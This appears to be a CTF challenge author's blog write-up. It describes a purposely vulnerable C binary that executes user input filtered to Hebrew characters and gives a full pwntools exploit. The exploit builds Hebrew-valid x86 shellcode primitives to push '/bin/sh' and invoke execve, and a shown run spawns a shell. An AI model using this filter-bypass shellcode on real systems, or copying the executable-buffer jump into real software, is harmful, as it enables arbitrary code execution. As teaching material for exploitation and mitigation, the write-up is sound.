---
title: Pwning Like Moses - Writing Hebrew Unicode Shellcode
date: 2025-11-05 09:00:00 +0300
tags:
  - CTF
  - Binary_Exploitation
  - Challenge_Author
---

> Bag of Tricks: C, Python, pwntools, x86 Docs, GDB
{: .prompt-tip }

# Pwning Like Moses

I was tasked with creating the toughest challenge for a 5 hour work CTF competition.
One of my favorite categories is binary, and while I browsed the גמרא, as one does I stumbled upon the perfect CTF challenge idea!

## Writing the Challenge

I vibe-coded (using 2023 chatgpt, was not the best) a C snippet that accepts a user buffer from stdin, checks if it is in Hebrew or one of the numbers/special charecters and if it is, `jmp`s to it.

This is the string validation:

```C
int charInSet(char c, const char* set) 
{
    size_t len = strlen(set);

    for (size_t i = 0; i < len; i++) {
        if (c == set[i]) {
            return 1;
        }
    }

    return 0;
}

int containsHebrew(const char* str, const char* set) 
{
    while (*str) {
        unsigned short tmp_char = *(wchar_t *)str;
        unsigned short flipped = (tmp_char << 8) | (tmp_char >> 8);

        if (charInSet(*str, set)) {
            str++;
        }
        else if ( flipped >= 0xd6b0 && flipped <= 0xd7b2  ) {
            str += 2;
        }
        else {
            return false;
        }
    }

    return true;
}
```

And the main logic:


```C
#include <stdio.h>
#include <wchar.h>
#include <wctype.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/mman.h>

#define BUF_SIZE (0x200000)

int main() {
    char* shellcode = mmap(NULL, BUF_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    const char* ALLOWED_CHARS = "1234567890!@#$%^&*()_+-=[]{},./\\\"':; " ;
    
    printf("קוד צדף בבקשה: ");
    fgets(shellcode, BUF_SIZE, stdin);
    
    size_t len = strlen(shellcode);
    if (len > 0 && shellcode[len - 1] == '\n') {
        shellcode[len - 1] = '\0';
    }
    len = strlen(shellcode);
    if (len > 0 && shellcode[len - 1] == '\r') {
        shellcode[len - 1] = '\0';
    }
    
    if (containsHebrew(shellcode, ALLOWED_CHARS)) {
        printf("קוד הצדף בעברית בלבד, כל הכבוד!...\n");
        void (*executeShellcode)() = (void (*)())shellcode;
        __asm__ __volatile__(
            "xor %%ecx, %%ecx"
            :
        );
        executeShellcode();
    } else {
        printf("עברית דבר עברית\n");
    }
    
    return 0;
}

```

Nice, now compiling the binary I resulted with:

```bash
Pwning-Like-Moses$ file tanach
tanach: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=f7848c34b2f4b05bfbc097c675dedce49c38c8cd, for GNU/Linux 3.2.0, not stripped
Pwning-Like-Moses$ ./tanach
קוד צדף בבקשה: Hello, World
עברית דבר עברית
Pwning-Like-Moses$ ./tanach
קוד צדף בבקשה: שלוםאדוני
קוד הצדף בעברית בלבד, כל הכבוד!...
Segmentation fault (core dumped)
Pwning-Like-Moses$ ./tanach
קוד צדף בבקשה: שלוםאדוני1323!
קוד הצדף בעברית בלבד, כל הכבוד!...
Trace/breakpoint trap (core dumped)
```

## Solving the Challenge (Proving Solvability)

### Reversing the Binary

I knowingly compiled the binary with symbols, so reversing won't be needed, and also provided the source code to the competitors.
But, let's still look at the binary and find out if it looks fine

![](/assets/2025-11-05-Pwning-Like-Moses-Hebrew-Shellcode/file-20251105121815830.png)

![](/assets/2025-11-05-Pwning-Like-Moses-Hebrew-Shellcode/file-20251105121821770.png)

Yes, pretty clear.

### Path to Win

In order to win we need to call `execv('/bin/sh')`, but the caveat is we can only use Hebrew valid (plus the special chars from above) to craft the `/bin/sh` onto the stack, setting the right syscall number and executing `syscall`.

To do such things, we need to find a way to use and abuse the two prefixes of hebrew chars, `D6, D7` in order to get the second byte "for free".
Meaning, if we can use one of the special chars, per say (single byte ASCII char) to take out the first byte of a Hebrew wide-char and then our second byte can execute freely in context that would be ideal.

Let's look at the Intel manual and try to create said escape:

![](/assets/2025-11-05-Pwning-Like-Moses-Hebrew-Shellcode/file-20251105123025030.png)

Perfect, byte 0x30 is '0' and in our special chars, and when paring it with a second byte we can xor two small values (thus inflicting less damage to our saved context in other registers).

![](/assets/2025-11-05-Pwning-Like-Moses-Hebrew-Shellcode/file-20251105123128577.png)

![](/assets/2025-11-05-Pwning-Like-Moses-Hebrew-Shellcode/file-20251105123140246.png)

Using `D6` is nice because we are xoring only the least significant 2 bytes of `rdx`, using `D7` we xor the second byte of `rbx` with the first of `rdx`.
Perfect❗ This means we can use the second byte for free, and if we can find `Single Byte Opcodes` that suit our case we can create primitives to change and modify the registers, and push values to the stack, thus creating our chain to win!!

![](/assets/2025-11-05-Pwning-Like-Moses-Hebrew-Shellcode/file-20251105123440677.png)

For example, `0x40` is in our range, and `0xd740` is a Hebrew valid char, and pairing it with a '0' creates a `inc eax` primitive!!!!

Now, we can find more of these to do a few basic operations:

* Pushing `eax` to the stack
* Popping a value from the stack
* Calling `syscall` - int 0x80

#### Exploit Chain

1. Pushing `/bin/sh` onto the stack
2. Setting `eax=0x0b` - `execv` syscall code
3. Pushing `int 0x80` and changing the current frame's return address to it
4. Returning, thus executing `/bin/sh` in the programs permissions.

### Creating Primitives

#### Primitive 1 - `inc eax`

As explained earlier, using '0' we can escape the first Hebrew wide char byte and get a free 1 byte opcode, when using it as 0x40 we get a free `inc eax`.
And when combining a few of these in a row, we can change `eax` as needed

```python
def inc_eax(n=1):
    return b'\x30\xd7\x40' * n
```

#### Primitive 2 - `dec eax`

![](/assets/2025-11-05-Pwning-Like-Moses-Hebrew-Shellcode/file-20251105140747306.png)

```python
def dec_eax(n=1):
    return b'\x30\xd7\x48' * n
```

And now combining with primitive number 1:

```python
def set_eax(value, prev):
    diff = value - prev
    if diff > 0:
        return inc_eax(diff)
    else:
        return dec_eax(-diff)
```

#### Primitive 3 - Pushing `al`

Pushing a full register is easy, it's a one byte opcode, but I want to push just `al`, so I can set it to a single char in every iteration and push it without zeroes in the middle of the stack. I'll demonstrate how it is done:

```python
def push_al():
    shellcode = b''

    shellcode += b'\x30\xd7\x92' # xchg eax, edx
    shellcode += b'\x30\xd7\x96' # xchg eax, esp ///->esi #fixed
    shellcode += b'\x30\xd7\x48' # dec eax
    shellcode += b'\x30\xd7\x88\xd6\xb3\x30' # mov dh, dl; nop
    shellcode += b'\x30\xd7\x88\x30' # mov [eax], dh
    shellcode += b'\x30\xd7\x96' # xchg eax, esp ///->esi #fixed
    shellcode += b'\x30\xd7\x92' # xchg eax, edx
    
    return shellcode
```

After getting this primitive, we can use all 3 to do our third goal, calling `syscall`.
Before we can do that, let's create a helper to push a string to the stack:

```python
def create_stack_string(byte_str):
    shellcode = b''
    last_value = 0

    for c in byte_str[::-1]:
        shellcode += set_eax(c, last_value)
        shellcode += push_al()

        last_value = c
    
    shellcode += set_eax(0, last_value)

    return shellcode
```
### Crafting the Exploit (pwntools)

Now all that's left is crafting all of these helpers into a working exploit, I'll write the steps we need to take:

1. `create_stack_string('/bin/sh')`
2. `create_stack_string(asm('int 0x80'))`
3. `eax=0x0b` (`execv`)
4. `frame[return_eip] = &stack[address_of_syscall_string]`
5. `ret`

The reason for step 2, and using the stack is to make a clean workspace, and I knowingly compiled the binary with an executable stack, making the challenge more on crafting the shellcode, than finicking with exploit level difficulties. We can also craft a payload that copies said bytes onto some code cave if the stack wasn't executable.

After combining all of the above, with the right registers for params we get the final exploit:

```python
from pwn import *

def main():
    buf = b''
    
    buf += inc_eax(0x10)
    buf +=  b'\x30\xd7\x96'  # xchg esi, eax 
    
    buf += b'\x30\xd7\x51\x30\xd7\x58' # push ecx; pop eax
    buf += create_stack_string('/bin/sh'.encode() + b'\x00')
    buf += b'\x30\xd7\x56\x30\xd7\x5f' # push ////esi ; pop edi (mov edi, esp) fixed
    buf += create_stack_string(b'\x90\xcd\x80') # nop int 0x80
    buf += b'\x30\xd7\x51\x30\xd7\x58' # push ecx; pop eax (to zero out eax)
    buf += inc_eax(0x0b) # setting eax to execv code
    
    buf += b'\x30\xd7\x57\x31\xd7\x5b' # mov ebx, edi
    buf += b'\x31\xd7\x51\x31\xd7\x5a' # mov edx, ecx
    buf += b'\x31\xd7\x56\x31\xd6\xc3' # push esi ret -> pushing fake return address onto the stack and the ret. esi=int 0x80 and eax=execv and when returning without using add rsp, frame_length we return onto the stack thus executing execv(/bin/sh) after setting the param in the right register

    open('temp.bin', 'wb').write(buf)
    print(len(buf))

    io = process('./tanach')
    io.sendline(buf)
    io.interactive()

if __name__ == '__main__':
    main()

```

Running the exploit:

```bash
/Pwning-Like-Moses$ python3 "solve.py"
2693
[+] Starting local process './tanach': pid 1331
[*] Switching to interactive mode
קוד צדף בבקשה: קוד הצדף בעברית בלבד, כל הכבוד!...
$ ls
 flag.txt                  solve.py     tanach.id2
 get-pip.py                tanach       tanach.nam
 linux_server              tanach.c     tanach.til
 linux_server64            tanach.i64   tanach_20251105121954.i64
 peda-session-tanach.txt   tanach.id0   temp.bin
'solve (1).py'             tanach.id1
$ cat flag.txt
FLAG{m0s3s_1s_h3r3_4nd_h4_1s_Pr0ud}$
[*] Interrupted
[*] Stopped process './tanach' (pid 1331)
```

## Conclusions

* Even using a very limited execute primitive, we can bend 0x86 to our will and execute code
* Machines in real life should use simple but effective mitigations like NX to prevent exploitation of "weak" primitives (although code execution is super strong, the limitations weaken it) like the one here.

:)